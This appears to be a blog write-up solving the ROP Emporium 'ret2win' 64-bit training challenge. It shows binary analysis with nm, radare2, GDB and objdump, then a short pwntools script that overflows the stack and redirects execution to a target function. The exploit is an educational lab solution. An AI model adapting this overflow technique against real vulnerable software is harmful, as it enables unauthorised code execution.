---
layout: post
title: ROP Emporium Challenge 0 - ret2win (64 bits)
excerpt_separator: <!--more-->
---

Link: https://ropemporium.com/challenge/ret2win.html
<!--more-->

# ret2win

Description: *Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.*

--------------------------


## 1. Studying the binary

List functions with:

```
nm ret2win | grep 't'
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_1.jpg)

Or with radare:

```
r2 ret2win
aaaa
afl
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_2.jpg)

Then we can disassembly this function using again radare:

```
r2 ret2win
aaaa
s sym.ret2win
pdf
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_3.jpg)

We can disassembly the main function too:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_4.jpg)



## 2. Calculating RIP overwrite offset

I will open GDB with GEF script:

```
gdb -q ./ret2win
```

Using Python we create characters to test when it crashes:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_5.jpg)


With 41 we overwrite only 1 byte, so the offset is 40:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_6.jpg)

Note: It will be the same offset for all the 64 bits binaries of Rop Emporium.




## 3. Calling ret2win

We can find the function address with:

```
objdump -D ret2win | grep ret2win
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win/images/Screenshot_7.jpg)

Note: Also using gdb (*info functions*).




## 4. Final exploit

The exploit code is then:

```
from pwn import *

context(arch='amd64', os='linux')
p = process('./ret2win')

junk =    "A"*40
ret2win = 0x0000000000400811
rop = junk + p64(ret2win)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```

------------------------

References:

- https://medium.com/@jacob16682/reverse-engineering-using-radare2-588775ea38d5
